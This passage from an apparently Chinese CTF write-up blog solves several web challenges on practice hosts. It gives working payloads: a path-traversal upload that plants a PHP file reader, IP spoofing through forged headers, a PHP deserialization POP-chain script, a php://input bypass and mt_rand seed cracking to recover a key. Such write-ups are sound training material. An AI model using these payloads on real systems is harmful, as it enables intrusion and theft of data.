class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Length</span>: 383</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=d7c1fe298429b3461f3a252fc9625491</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="../../1.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;?php echo file_get_contents("/flag")?&gt;</span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------29705509393397799580693485075--</span><br></pre></td></tr></table></figure><p>访问url/upload/9af352e703653f2467a045cde806bd86/1.jpg</p><p>即可得到flag</p><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>查看源码，发现有一段js验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">          alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">          <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>跟随到flag.php，提示记录了IP</p><p><img src="/pic/145.png" alt=""></p><p>加一个xff</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:27983</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br></pre></td></tr></table></figure><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>打开就是源码，序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line">__set()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line">__invoke()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><p>pop链  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Show::__wakeup()-&gt;Show::__toString()-&gt;Test::__get()-&gt;Modifier::__invoke()-&gt;Modifier::append()</span><br><span class="line"></span><br><span class="line">preg_match()正则是匹配字符串，传入的是对象，会触发__toString()，$this-&gt;str-&gt;source  str是Test类，触发__get，属性p是Modifier类，触发__invoke()，include可以利用伪协议包含flag。php源码</span><br></pre></td></tr></table></figure><p>编写序列化脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var&#x3D;&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s&#x3D;new Show();</span><br><span class="line">$t&#x3D;new Test();</span><br><span class="line">$s-&gt;str&#x3D;$t;</span><br><span class="line">$s-&gt;source&#x3D;$s;</span><br><span class="line">echo urlencode(serialize($s));</span><br><span class="line">&#x2F;&#x2F;O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><p>将得到的base64解码即可拿到flag</p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>打开题目查看源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="comment">$query = $_SERVER['QUERY_STRING'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123;</span></span><br><span class="line"><span class="comment">    die('Y0u are So cutE!');</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"> if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123;</span></span><br><span class="line"><span class="comment">    echo "you are going to the next ~";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">!--&gt;</span></span><br></pre></td></tr></table></figure><p>$_SERVER是不进行urldecode解析的，被ban了%5f,但是可以传%5F</p><p>第二个使用%0a（换行）结尾即可绕过  关于<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html" target="_blank" rel="noopener">preg_match绕过</a></p><p>拿到secrettw.php，</p><p>查看源码是jencode/<em>aaencode</em>(颜文字),刚入ctf那会在南邮平台见过，直接在F12控制台执行即可</p><p>得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post me Merak</span><br></pre></td></tr></table></figure><p>然后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">?php </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于第一个if  使用client-ip绕过，第二个可以使用php://input绕过</p><p>对于chenge写一个解密函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v=<span class="string">"flag.php"</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(base64_encode($re));</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">change();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 470d4194-20d2-4996-bf51-da5557926abb.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">client-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure><h2 id="Not-So-Web-Application"><a href="#Not-So-Web-Application" class="headerlink" title="Not  So Web Application"></a>Not  So Web Application</h2><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫描目录得到源码<a href="http://www.zip,还有一个login.php" target="_blank" rel="noopener">www.zip,还有一个login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);  <span class="comment">//mt_rand(min,max)  返回随机数</span></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>mt_rand种子可以爆破。项目地址<a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https://github.com/lepiaf/php_mt_seed</a></p><p>按照格式生成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">strs=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in range(len(strs)):</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]), end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]),<span class="string">'0'</span> ,end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(len(strings1)<span class="number">-1</span>, end=<span class="string">' '</span>)</span><br><span class="line"><span class="comment"># 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">% ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Found 0, trying 1744830464 - 1778384895, speed 46429762 seeds per second </span><br><span class="line">seed = 1775196155</span><br><span class="line">Found 1, trying 4261412864 - 4294967295, speed 44036507 seeds per second </span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>拿到种子，生成私钥</p><figure class="highlight 